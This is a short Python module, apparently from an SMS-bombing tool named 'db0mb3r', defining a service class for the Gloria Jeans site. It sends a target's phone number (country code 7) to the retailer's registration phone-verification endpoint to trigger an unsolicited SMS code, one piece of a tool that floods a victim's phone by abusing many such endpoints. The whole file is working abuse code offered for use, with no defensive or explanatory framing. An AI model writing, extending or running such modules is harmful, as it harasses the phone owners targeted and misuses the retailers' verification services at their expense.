from db0mb3r.services.service import Service


class GloriaJeans(Service):
    phone_codes = [7]

    async def run(self):
        await self.post('https://www.gloria-jeans.ru/phone-verification/send-code/registration',
                        json={"phoneNumber": "+" + self.formatted_phone})
